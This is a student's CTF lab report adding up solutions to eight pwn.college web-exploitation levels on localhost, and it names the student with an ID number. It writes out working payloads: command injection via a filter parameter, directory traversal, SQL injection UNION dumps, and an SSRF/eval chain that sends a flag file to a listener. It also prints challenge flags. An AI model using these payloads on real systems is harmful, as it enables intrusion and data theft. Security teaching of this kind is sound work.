@@ -1,0 +1,212 @@
+Pwn Them All Assignment Report
+Name: Shachi Shah
+ID #: 1217121828
+
+Level 1:
+	1. I explored the page at http://localhost:8000
+	2. I inspected form.html using curl
+		- I noticed that it included a decoy login form that called verify() - a javascript function
+	3. I fetched /cgi-bin/verify.js
+	4. Guessed common file paths and scanned for hidden files
+	5. Opened the page in a browser with Burp Suite running
+	6. Found the real logic in Burp Pretty response tab
+		- Discovered the real verify() function with hardcoded credentials and the flag
+			if ((form.username.value == "scipt") &&
+				alert("You got it! The secret is: pwn.college{...}"))
+	7. Extracted the flag and completed the challenge
+
+Level 2:
+	1. Explored the page
+		- Visited http://localhost:8000/ and found a link to a "Ridiculous Social Network" that printed:
+			Active Users in the Ridiculous Social Network
+			hacker
+			root
+			www-data
+		- The page dynamically updated via javascript, and source inspection revealed this key code:
+			http_request.open("GET", "/cgi-bin/users.php?filter=" + f.value, true);
+		- This confirmed that the user input was sent unsanitized to the backend via a filter parameter
+	2. Confirmed command injectyion possibility
+	3. Injected directly via the Browser Console
+		- Knowing the JavaScript controlled the request, I bypassed URL encoding issues by overriding the getusers() function in the browser’s DevTools Console:
+			getusers = function() {
+				  var http_request = new XMLHttpRequest();
+				  http_request.onreadystatechange = function() {
+				    if (http_request.readyState == 4 && http_request.status == 200) {
+				      document.body.innerHTML = '<pre>' + http_request.responseText + '</pre>';
+				    }
+				  };
+				  http_request.open("GET", "/cgi-bin/users.php?filter=admin;cat secretuser.txt", true);
+				  http_request.send(null);
+				};
+				getusers();
+	4. The server responded weitht he contents of secretuser.txt, revealing the flag
+
+Level 3:
+	1. Explored the Form
+		- Visited the petition page and found this form:
+			<form action="/cgi-bin/petition.py" method="get">
+			  ...
+			  <input type="text" name="email"/>
+			  ...
+			  <input type="text" name="id"/>
+			</form>
+		- Confirmed that the form submits to /cgi-bin/petition.py and allows both email submission and ID-based access.
+	2. Submitted My Own Entry
+		- curl 'http://localhost:8000/cgi-bin/petition.py?first=Fake&last=Entry&email=fishw@asu.edu&comment=testing'
+		- Server responded with: Your ID is 43b4ea99e7dd48b687d772288fad1d00
+		- This is the ID tied to the target user
+	3. Accessed the COmment via ID Directly
+		- curl 'http://localhost:8000/cgi-bin/petition.py?id=43b4ea99e7dd48b687d772288fad1d00'
+		- The server returned the comment originally submitted by fishw@asu.edu, including the flag
+
+Level 4:
+	1. Initial Discovery
+		- The main page showed a login form at /cgi-bin/it.php. After logging in with any credentials (e.g., test:test), I was redirected to a second form where I could specify a filename and data.
+		- This hinted at possible file read/write functionality on the backend.
+	2. Identifying the Vulnerability
+		- I noticed a hidden input in a later form:
+			<input type="hidden" name="readmode" value="yes"/>
+		- This suggested a file read feature. Time to try directory traversal.
+	3. Directory Traversal Attempt #1 from the professor's hint
+		- I submitted the following payload using Burp Suite:
+			filename=../../../challenge/session
+			readmode=yes
+			nonce=1748877892
+		- And got the response: sess_91c7e1e10744d69fd8fe35ecfc
+			- For the longest time I didn't consider that this could be a folder
+	4. Directory Traversal Attemp #2 from my previous attempts discovery
+		- I used the previous filename as a folder path:
+			filename=../../../challenge/session/sess_91c7e1e10744d69fd8fe35ecfc
+			readmode=yes
+			nonce=1748877892
+		- Got the output that contained the flag: username|s:4:"fish";password|s:32:"pwn.college{AQ4W9oP9TQU4mU9OfbhjFYKERc4.QX3AzNzEDLyczM0MzW}";nonce|i:893397759;last_filename|s:8:"9c69cfcf"
+
+Level 5:
+	1. Discover the admin=1 backdoor
+		- On the main form page, there is a hidden input
+			<input type="hidden" name="admin" value="0" />
+		- I had to change it to:
+			<input type="hidden" name="admin" value="1" />
+			for both the create and reteieve forms
+	2. Investigate required cookies
+		- With admin=1, the cript checks for cookies:
+			- site
+			- password
+		- If they are missing, it throws errors like:
+			- "Non- existent cookie entries: site"
+			- "Wrong password."
+	3. Discover the hardcoded admin password
+		- I needed to set blacklist=store, id=admin, password=test, site=bank.com, username=test to get the storage's admin note page
+		- I needed to set blacklist=retrieve, id=admin, password=test, site=bank.com, username=test to get the retrieval's admin note 
+		- Finally I needed to set blacklist=blacklist, id=admin, password=test, site=bank.com, username=test to get the blacklist's admin note 
+		- By viewing the source of /cgi-bin/retrieve using Firefox's dev tools I got
+			if password != 'terriblechoice':
+    			die("Wrong password.")
+    4. Understand how admin retrieval works
+    	- In admin mode, the script:
+    		- Iterates over all files in /challenge/storage/
+    		- Returns any lines that contain the site string from the cookie
+    5. Perform the final exploit:
+    	- Set blacklist=retrieve, id=admin, password=terriblechoice, site=www.bank.com, and username=test to get the flag:
+    		- www.bank.com:fish:pwn.college{U6JTdxJJhI1liXJqXCic30A5a4c.QX4AzNzEDLyczM0MzW}
+    		- This was duemped to www.bank.com no matter the user.
+
+Level 6:
+	1. Starting Point
+		- The server at http://localhost:8000/cgi-bin/index.php returned responses based on my browser's User-Agent. For example with Safari:
+			- "I guess you like Safari!"
+			- This hinted that the backend was reading and possibly using the User-Agent string in more than just a simple display.
+	- Discovery: SSRF via User-Agent
+		- Using Burp and curl, I testest:
+			- curl -A "http://127.0.0.1:8000/secret" http://localhost:8000/cgi-bin/index.php
+				- And got: I cannot figure out your personality: file http://127.0.0.1:8000/secret.php has no code
+			- This confirmed:
+				- The server fetches user-Agesnt+".php"
+				- It evaluates the content, likely via eval() or include()
+				- If there's no executable code, it returns the "has no code" message
+	- Weaponizing Code Execution
+		- Payload requirements:
+			- The server likely does: eval(file_get_contents($_SERVER['HTTP_USER_AGENT'] . ".php"));
+			- Which means:
+				- Payload must be raw PHP code, without <?php tags
+				- Example: echo "hi"; instead of <?php echo "hi"; ?>
+	- Step-by-Step Exploit
+		1. Create the payload:
+			- echo 'file_get_contents("http://127.0.0.1:8001/?leak=" . urlencode(file_get_contents("/challenge/flag")));' > flag.php
+				- This causes the vulnerable server to read the flag, make a GET request to my python server at port 8001, and incluide the flag as a querty string value
+		2. Start local server
+			- python3 -m http.server 8001
+			- Now flag.php is served at http://127.0.0.1:8001/flag.php
+		3. Trigger SSRF + Eval
+			- curl -A "http://127.0.0.1:8001/flag" http://localhost:8000/cgi-bin/index.php
+			- The backend fetched flag.php, executed it, and attempted to exfiltrate the flag.
+		4. Interact and Pivot
+			- Since /challenge/flag didn't exist, I used system("ls -l /challenge") to explore the file structure:
+				- echo 'file_get_contents("http://127.0.0.1:8001/?debug=" . urlencode(system("ls -l /challenge")));' > flag.php
+			- This revealed a directory:
+				- /challenge/public_html
+			- I navigated deeper and found:
+				- /challenge/public_html/cgi-bin/s3cr37.pwd
+		5. Read the flag!
+			- Final payload:
+				- echo 'file_get_contents("http://127.0.0.1:8001/?leak=" . urlencode(file_get_contents("/challenge/public_html/cgi-bin/s3cr37.pwd")));' > flag.php
+			- Triggered again:
+				- curl -A "http://127.0.0.1:8001/flag" http://localhost:8000/cgi-bin/index.php
+			- I looked back at the HTTP server log and got:
+				- 127.0.0.1 - - [09/Apr/2025 23:38:45] "GET /flag.php HTTP/1.0" 200 -
+					127.0.0.1 - - [09/Apr/2025 23:38:45] "GET /?leak=pwn.college%7Bswbkhl1nqPuJxVZ_YrQ4FSfLOal.QX5AzNzEDLyczM0MzW%7D%0A HTTP/1.0" 200 -
+				- When decoded I got my submittable flag: pwn.college{swbkhl1nqPuJxVZ_YrQ4FSfLOal.QX5AzNzEDLyczM0MzW}
+
+Level 7:
+	1. SQL Injection Testing
+		- Begin with ' OR 1=1 -- -
+		-This input caused the application to dump a list of registered users, confirming an unsanitized SQL query is being executed on the backend
+	2. Find the Number of columns
+		- ' UNION SELECT NULL -- -
+			' UNION SELECT NULL,NULL -- -
+			...
+			' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- -
+		- The final version with six columns returned no SQL error, meaning: the query has six columns
+	3. Dumping the Passwords
+		- Our goal: place the password column into a visible field on the response page.
+		- So, we used the following payload in the username field:
+			' UNION SELECT username, email, password, firstname, lastname, 'hax' FROM users -- -
+			And filled the rest of the form with dummy values.
+	4. Output
+		- This revealed all user credentials:
+			Username: admin
+			First: pwn.college{8AIPbkZZ5NrlaeZ45IwQw582WGG.QXwEzNzEDLyczM0MzW}
+			Last: Wang
+		- The passwords were shown in the “First” field, due to column ordering in the SQL injection.
+
+Level 8:
+	- Initial Recon
+		- The login page at begin.html presents a standard form:
+			<form action="start.php" method="post">
+			  <input type="text" name="username">
+			  <input type="password" name="password">
+			</form>
+		- Submitting any credentials like test/test returns: "User database updated" — but leads nowhere.
+		- However, entering:
+			- username: admin
+			- password: admin
+		- redirected to a new page: /2factor.php
+	- Exploitation
+		- The challenge hint suggests:
+			- “Two-factor authentication is used but encoded in base64.”
+			- “The decoded string may contain the flag.”
+			- “If something looks like gibberish, it might need decoding.”
+		- So the 2FA token is likely stored somewhere as a base64 string.
+		- Step 1: Try Submitting a Value
+			- Entering various values (like admin:admin, 123456, or base64-encoded guesses) in the form failed and redirected to begin.html.
+		- Step 2: Intercept the Request with Burp Suite
+			- With Burp Suite active, I submitted: 
+				- 2FA input: admin:admin
+			- While Firefox Dev Tools didn’t show anything useful, Burp Suite captured a crucial hidden response from 2factor.php:
+				- YWRtaW46cHduLmNvbGxlZ2V7bzNNS0VmRTFBRmkzTDRWQ0M0a0lLQ3FoVWplLlFYeEV6TnpFREx5Y3pNME16V30=
+			- This base64 string clearly matched the format of:
+				- admin:pwn.college{...}
+	- Decoding
+		- echo 'YWRtaW46cHduLmNvbGxlZ2V7bzNNS0VmRTFBRmkzTDRWQ0M0a0lLQ3FoVWplLlFYeEV6TnpFREx5Y3pNME16V30=' | base64 -d
+		- Result:
+			- admin:pwn.college{o3MKEfE1AFi3L4VCC4kIKCqhUje.QXxEzNzEDLyczM0MzW}
